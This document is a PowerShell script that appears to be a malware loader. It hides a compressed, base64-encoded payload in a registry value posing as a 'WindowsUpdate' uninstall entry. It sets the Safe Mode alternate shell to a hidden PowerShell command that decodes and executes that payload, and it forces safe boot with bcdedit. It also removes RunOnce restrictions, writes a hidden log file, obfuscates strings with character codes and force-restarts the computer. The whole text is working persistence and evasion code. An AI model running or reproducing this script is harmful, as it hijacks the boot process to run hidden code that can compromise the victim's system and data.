[CmdletBinding()]param([Switch]$Confirm)
if(!$Confirm){Exit 1}
if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)){Exit 1}
$b='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'
$c=[string]::Join('\',('SOFTWARE','Microsoft','Windows','CurrentVersion'));$r="HKLM:\$c\Uninstall\WindowsUpdate";
if(!(Test-Path $r)){New-Item -Path $r -Force|Out-Null};
Set-ItemProperty -Path $r -Name ([char[]](73,110,115,116,97,108,108,68,97,116,101)-join'') -Value $b -Type 'String' -ErrorAction 0;
$lf = "C:\ProgramData\ksi.log";
$d = Get-Date -Format "yyyy-MM-dd HH:mm:ss";
"[$d] [INJECT] DEPLOY" | Out-File -FilePath $lf -Append -Encoding utf8;
(Get-Item $lf).Attributes = 'Hidden, System';

$sCmd = 'powershell.exe -WindowStyle Hidden -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "$P=(Get-ItemProperty ''HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsUpdate'').InstallDate;$M=[IO.MemoryStream]::new([Convert]::FromBase64String($P));$D=[IO.Compression.DeflateStream]::new($M,[IO.Compression.CompressionMode]0);$S=[IO.StreamReader]::new($D);IEX $S.ReadToEnd()"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($sCmd)
$eCmd = [Convert]::ToBase64String($bytes)
$ImagePath = "powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -e $eCmd"
$altPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot";
if(!(Test-Path $altPath)){New-Item -Path $altPath -Force | Out-Null};
Set-ItemProperty -Path $altPath -Name "AlternateShell" -Value $ImagePath -Type String -ErrorAction Stop;

"HKLM:\$c\Policies\Explorer","HKCU:\$c\Policies\Explorer"|ForEach-Object{if(Test-Path $_){Remove-ItemProperty -Path $_ -Name "DisableRunOnce" -ErrorAction 0;Remove-ItemProperty -Path $_ -Name "DisableLocalMachineRunOnce" -ErrorAction 0}};
Remove-ItemProperty -Path "HKLM:\$c\RunOnce" -Name '*x' -ErrorAction 0;
$cur = [char[]](123,99,117,114,114,101,110,116,125) -join '';
$sfb = [char[]](115,97,102,101,98,111,111,116) -join '';
$min = [char[]](109,105,110,105,109,97,108) -join '';
$alt = [char[]](115,97,102,101,98,111,111,116,97,108,116,101,114,110,97,116,101,115,104,101,108,108) -join '';
& bcdedit.exe /set $cur $sfb $min | Out-Null;
& bcdedit.exe /set $cur $alt yes | Out-Null;
if($LASTEXITCODE){ Exit 1; };
"[$d] [INJECT] BCK_OK" | Out-File -FilePath $lf -Append -Encoding utf8;
Restart-Computer -Force;
